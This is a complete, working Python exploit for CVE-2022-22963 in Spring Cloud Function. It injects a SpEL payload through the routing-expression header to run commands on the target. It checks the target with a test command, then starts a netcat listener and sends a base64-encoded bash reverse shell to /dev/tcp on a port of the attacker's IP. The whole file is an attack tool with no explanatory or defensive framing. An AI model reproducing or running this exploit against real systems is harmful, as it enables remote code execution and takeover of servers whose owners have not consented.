#!/usr/bin/python3
import requests
import argparse
import socket, sys, time
from threading import Thread
import os
import base64

# Netcat listener function
def nc_listener():
    os.system("nc -lnvp 4444")

# Exploit function to send the payload
def exploit(url, cmd):
    vuln_url = f'{url}/functionRouter'
    payload = f'T(java.lang.Runtime).getRuntime().exec("{cmd}")'
    body = '.'
    headers = {
        'spring.cloud.function.routing-expression': payload,
        'Accept': '*/*',
        'User-Agent': 'Mozilla/5.0 (compatible; VulnerabilityScanner/1.0)',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    response = requests.post(url=vuln_url, data=body, headers=headers, verify=False, timeout=5)
    return response

# Function to check if the target is vulnerable
def is_vulnerable(code, text):
    error_msg = '"error":"Internal Server Error"'
    if code == 500 and error_msg in text:
        print(f'[+] {args.url} is vulnerable\n')
        return True
    else:
        print(f'[-] {args.url} is not vulnerable\n')
        return False

if __name__ == "__main__":
    
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", dest="url", help="Example: http://mysite.com:8080")
    args = parser.parse_args()
    
    if args.url is None:
        parser.print_help()
        sys.exit(1)
    
    print(f"[+] Target {args.url}\n")
    print(f"[+] Checking if {args.url} is vulnerable to CVE-2022-22963\n")
    response = exploit(args.url, "touch /tmp/pwned")
    vulnerable = is_vulnerable(response.status_code, response.text)
    
    if vulnerable:
        chk = input("[/] Attempt to take a reverse shell? [y/n] ")
    
    if chk.lower() == 'y':
        listener_thread = Thread(target=nc_listener)
        listener_thread.start()
        time.sleep(2)
        
        while True:
            try:
                attacker_ip = input("[$$] Attacker IP:  ")
                socket.inet_aton(attacker_ip)  # Validate IP address format
                break
            except socket.error:
                print("[!] Invalid IP address. Please enter a valid IP address.")
        
        command = f"bash -i >& /dev/tcp/{attacker_ip}/4444 0>&1"
        final_command = f'bash -c {{echo,{base64.b64encode(command.encode("utf-8")).decode("utf-8")}}}|{{base64,-d}}|{{bash,-i}}'
        
        try:
            exploit(args.url, final_command)
        except Exception as e:
            print(f"[-] An error occurred while executing the exploit: {e}")
    else:
        sys.exit(0)